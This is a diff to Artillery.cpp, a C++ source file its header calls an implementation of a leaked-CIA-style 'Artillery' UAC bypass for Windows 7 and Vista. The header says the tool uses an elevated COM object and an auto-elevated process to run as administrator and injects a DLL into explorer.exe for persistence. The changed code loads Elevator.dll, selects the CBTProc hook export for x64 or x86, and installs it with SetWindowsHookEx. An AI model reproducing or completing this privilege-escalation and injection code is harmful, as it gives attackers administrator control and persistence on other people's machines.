@@ -1,3 +1,27 @@
+/*
+ * Filename: Artillery.cpp
+ *
+ * Classification:
+ * Classified By:
+ *
+ * Tool Name: Artillery
+ * Requirement #:2022-1337
+ *
+ * Author: Hacker Fantastic
+ * Date Created:        12/30/2023
+ * Version 1.0:12/30/2023 (00:00)
+ *
+ * The Vault7 wiki contains references to privilate escalation modules
+ * used by the AED. This is an implementation of "Artillery - UAC Bypass"
+ * which is one of four UAC bypasses. 
+ * 
+ * Artillery Utilizes elevated COM object to write to System32 and an 
+ * auto-elevated process to execute as administrator. According to the
+ * wiki this is used for persistence through injection of a FAX DLL to
+ * explorer.exe. This UAC bypass (and the persitence) has been tested
+ * on Windows 7 and Windows Vista. 
+ * 
+ */
 #include <windows.h>
 #include <tlhelp32.h>
 #include <tchar.h>
@@ -129,24 +153,25 @@ int main()
         return 1;
     }
     HMODULE hDll = LoadLibraryEx(szElevatorDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
-    //HMODULE hDll = LoadLibraryEx(szElevatorDllPath, NULL, 0);
     if (!hDll)
     {
         std::cerr << "Failed to load Elevator.dll: " << GetLastError() << std::endl;
         return 1;
     }
     printf("Loaded Elevator.dll\n");
-    //x86
-    //HOOKPROC hookProcAddr = (HOOKPROC)GetProcAddress(hDll, "_CBTProc@12");
+#ifdef _WIN64
     // x64
     HOOKPROC hookProcAddr = (HOOKPROC)GetProcAddress(hDll, "CBTProc");
+#elif _WIN32
+    // x86
+    HOOKPROC hookProcAddr = (HOOKPROC)GetProcAddress(hDll, "_CBTProc@12");
+#endif
     if (!hookProcAddr)
     {
         std::cerr << "Failed to get _CBTProc address: " << GetLastError() << std::endl;
         return 1;
     }
     printf("Got _CBTProc address\n");
-
     HHOOK hHook = SetWindowsHookEx(WH_GETMESSAGE, hookProcAddr, hDll, tid);
     if (!hHook)
     {
